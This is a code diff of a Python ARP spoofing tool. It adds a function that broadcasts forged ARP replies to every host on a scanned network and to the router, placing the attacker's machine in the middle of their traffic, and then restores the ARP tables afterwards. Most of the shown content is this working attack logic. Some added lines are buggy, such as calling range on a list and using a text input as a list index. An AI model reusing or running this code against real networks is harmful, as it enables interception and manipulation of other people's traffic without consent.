@@ -81,6 +81,33 @@ def scanNetwork(mask: str, scanTimes: int=5) -> dict:
     return networkScan
 
 
+# main attack functions
+
+def startAttack(myIp, myMac, routerIp, routerMac, networkScan):
+    sentPackCount = 0
+
+    while True:
+        try:
+            for clientIp in networkScan:
+                if clientIp == myIp or clientIp == routerIp: continue # do not touch router or yourself ( :3 )
+
+                # send arp packs
+                sendPackage(createARPpackage(clientIp, myMac, routerIp), 'ff:ff:ff:ff:ff:ff')
+                sendPackage(createARPpackage(routerIp, myMac, clientIp), 'ff:ff:ff:ff:ff:ff')
+                sentPackCount += 2
+
+            time.sleep(1)
+            print(f'{datetime.now()}   [{sentPackCount}] Sending packets... Press Ctrl+C to stop.', end='\r')
+        
+        except KeyboardInterrupt:
+            break
+
+def restoreArpTable(routerIp, routerMac, networkScan):
+    for clientIp in networkScan:
+        sendPackage(createARPpackage(clientIp, networkScan[clientIp], routerIp), 'ff:ff:ff:ff:ff:ff')
+        sendPackage(createARPpackage(routerIp, routerMac, clientIp), 'ff:ff:ff:ff:ff:ff')
+
+    print(f'ARP table has been restored.')
 
 
 def main():
@@ -105,30 +132,20 @@ def main():
 
     print(networkScan)
     print(f'\n{datetime.now()}   Found devices: ')
-    for host in networkScan:
-        print(host, '  ', networkScan[host])
+    for keyId in range(list(networkScan.keys())):
+        host = list(networkScan.keys())[keyId]
+        print(keyId, '  ', host, '  ', networkScan[host])
 
+
+    USER_INPUT = input('Choose router (destination device) details (ip/mac) [default=0]: ')
+    routerIp = list(networkScan.keys())[USER_INPUT if USER_INPUT != '' else 0]
+    routerMac = networkScan[routerIp]
 
     #  starting attack
-    input('\n\nPress Enter to start funnel.')
+    input('\n\nPress Enter to start funnel.\n\n')
 
-    sentPackCount = 0
-
-    while True:
-        try:
-            sendPackage(createARPpackage(clientIP, myMac, routerIp), 'ff:ff:ff:ff:ff:ff')
-            sendPackage(createARPpackage(routerIp, myMac, clientIP), 'ff:ff:ff:ff:ff:ff')
-
-            sendedPackCount += 2
-            print(f'[{sendedPackCount}] sent package'),
-
-            time.sleep(1)
-        except KeyboardInterrupt:
-            sendPackage(createARPpackage(clientIP, clientMac, routerIp), 'ff:ff:ff:ff:ff:ff')
-            sendPackage(createARPpackage(routerIp, routerMac, clientIP), 'ff:ff:ff:ff:ff:ff')
-            print('Arp table has been restored.')
-
-            exit()
+    startAttack(myIp, myMac, routerIp, routerMac, networkScan)
+    restoreArpTable(routerIp, routerMac, networkScan)
 
 
 if __name__ == '__main__': main()
